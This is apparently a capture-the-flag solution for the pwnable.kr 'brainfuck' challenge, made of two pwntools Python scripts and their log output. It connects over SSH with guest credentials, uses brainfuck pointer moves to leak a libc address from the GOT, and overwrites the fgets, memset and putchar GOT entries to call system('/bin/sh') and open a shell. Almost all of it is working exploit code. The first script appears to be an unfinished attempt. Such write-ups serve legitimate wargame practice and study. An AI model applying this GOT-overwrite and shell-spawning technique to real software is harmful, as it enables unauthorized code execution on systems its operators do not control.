```python
from pwn import *

context.log_level = 'debug'
session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest')
p = session.process('./brainfuck')

output = p.recvuntil(b"type some brainfuck instructions except [ ]\n")
print(output.decode(errors='ignore'), end='')

bf_code = ',>' * 10 + ',' + '<' * (10 + 148) + ',>' * 3 + ',' + ','
print(bf_code)
p.sendline(bf_code.encode())

payload = bytes.fromhex("ff352b8bedf7e86551dcf7" + "0804a0a0")
print(payload)
p.send(payload)

p.interactive()
session.close()
```

```python
from pwn import *

context(log_level='debug', os='linux', arch='i386')

session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest')
p = session.process('./brainfuck')

# Local files for finding offsets (which do not affected by ASLR)
e = ELF(r'c:\Users\dalal\Desktop\Private_Projects\CTF\pwnable.kr\brainfuck\brainfuck')
libc = ELF(r'c:\Users\dalal\Desktop\Private_Projects\CTF\pwnable.kr\brainfuck\libc-2.23.so')

fgets_got = e.got['fgets']
memset_got = e.got['memset']
putchar_got = e.got['putchar']

# Libc offsets
fgets_offset = libc.symbols['fgets']
gets_offset = libc.symbols['gets']
system_offset = libc.symbols['system']
main_addr = e.symbols['main'] # does not affected by ASLR

tape_addr = 0x804a0a0

payload = ""

# Move to fgets@got
payload += "<" * (tape_addr - fgets_got)

# Leak 4 bytes of fgets address
payload += ".>" * 4
payload += "<" * 4 

# Overwrite fgets@got with system address
payload += ",>" * 4
payload += "<" * 4

# Move to memset@got
payload += ">" * (memset_got - fgets_got)

# Overwrite memset@got with gets address
payload += ",>" * 4

# Overwrite putchar@got with main address (The pointer is already in putchar@got so no need to move)
payload += ",>" * 4

# Trigger main() by calling putchar
payload += "."


p.sendlineafter(b"type some brainfuck instructions except [ ]\n", payload.encode())
sleep(0.1)

fgets_addr = u32(p.recvn(4))

libc_base = fgets_addr - fgets_offset
system_addr = libc_base + system_offset
gets_addr = libc_base + gets_offset

log.info(f"fgets_addr: {hex(fgets_addr)}")
log.info(f"libc base: {hex(libc_base)}")
log.info(f"system_addr: {hex(system_addr)}")
log.info(f"gets_addr: {hex(gets_addr)}")
log.info(f"main_addr: {hex(main_addr)}")

payload = p32(system_addr) + p32(gets_addr) + p32(main_addr)
p.send(payload)
sleep(0.3)

p.sendlineafter(b"type some brainfuck instructions except [ ]\n", b"/bin/sh\0") # Send "/bin/sh" to trigger system("/bin/sh")
sleep(0.3)

p.interactive()
session.close()

```

```
[*] fgets_addr : 0xf7dde6c0
[*] libc base  : 0xf7d80560
[*] system_addr: 0xf7dbb310
[*] gets_addr  : 0xf7ddf950
[*] main_addr  : 0x8048671
```
